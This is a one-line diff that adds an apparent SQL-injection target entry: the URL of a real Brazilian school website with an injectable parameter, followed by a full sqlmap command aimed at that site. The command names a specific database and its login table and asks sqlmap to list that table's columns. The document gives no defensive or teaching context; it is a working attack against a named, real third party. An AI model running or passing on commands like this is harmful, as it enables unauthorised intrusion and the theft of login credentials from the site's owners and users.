@@ -1,0 +1,1 @@
+http://www.domboscojaciara.com.br/?pg=ver_editorial&id=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.domboscojaciara.com.br/?pg=ver_editorial&id=1 -D domboscojaciar -T grcd_login --columns
